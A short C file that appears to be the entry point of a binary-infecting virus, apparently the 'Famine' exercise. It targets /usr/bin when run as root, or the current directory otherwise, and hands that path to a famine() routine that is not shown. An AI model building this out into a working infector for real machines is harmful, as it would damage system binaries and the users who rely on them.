#include <famine.h>

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void entry(void)
{
	char *bin[] = {"/bin", "/usr/bin", "/sbin", "usr/sbin"};
	char cwd[] = ".";
	char *dir;

	if (getuid() == 0)
		dir = bin[1];
	else
		dir = cwd; 

	famine(dir);
}

////////////////////////////////////////////////////////////////////////////////
/// BOOTSTRAP FUNCTION
////////////////////////////////////////////////////////////////////////////////

int main(void)
{
	entry();

	return 0;
}
